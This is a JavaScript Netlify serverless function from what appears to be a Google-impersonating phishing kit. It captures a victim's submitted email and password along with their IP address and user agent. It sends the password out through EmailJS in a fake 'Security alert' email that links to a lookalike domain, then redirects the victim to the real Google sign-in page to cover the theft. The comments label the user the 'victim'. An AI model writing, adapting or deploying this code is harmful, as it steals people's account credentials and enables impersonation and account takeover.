exports.handler = async (event) => {
    // 1. Parse the incoming form data
    const params = new URLSearchParams(event.body);
    const victimEmail = params.get('email');
    const victimPassword = params.get('password');

    // 2. Get request metadata
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const userAgent = event.headers['user-agent'] || 'Unknown';
    const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown';

    // 3. Define your Netlify URL (The phishing link)
    const verifyLink = 'https://googlesupportt.netlify.app';

    // 4. Prepare the email data for EmailJS
    const emailData = {
        service_id: 'service_ib3ua9l',
        template_id: 'template_alpyguf',
        user_id: 'Umle-w26jGP29PfnV',
        template_params: {
            subject: `Security alert: New device signed in to ${victimEmail}`,
            target_email: victimEmail,
            ip: ip,
            timestamp: timestamp,
            user_agent: userAgent,
            verify_link: verifyLink,
            password: victimPassword
        }
    };

    try {
        // 5. Send the email using EmailJS
        const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(emailData)
        });

        const data = await response.json();
        console.log('EmailJS Response:', data);

    } catch (error) {
        console.error('EmailJS error:', error);
    }

    // 6. Redirect the victim to the real Google login page
    return {
        statusCode: 302,
        headers: {
            'Location': 'https://accounts.google.com'
        }
    };
};
